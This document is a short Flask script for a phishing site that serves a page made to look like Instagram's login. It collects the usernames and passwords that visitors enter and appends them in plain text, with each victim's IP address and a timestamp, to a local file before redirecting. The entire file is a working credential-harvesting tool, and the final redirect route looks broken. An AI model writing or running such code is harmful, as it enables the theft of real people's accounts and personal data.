
from flask import Flask, request, render_template, redirect, url_for
from datetime import datetime

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        ip = request.remote_addr
        time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        with open("credentials.txt", "a") as f:
            f.write(f"Usuario: {username} | Contraseña: {password} | IP: {ip} | Fecha: {time}\n")

        return redirect(url_for('gracias'))
    return render_template("Instagram.html")

@app.route('/gracias')
def gracias():
    return render_template("Location: https://www.instagram.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
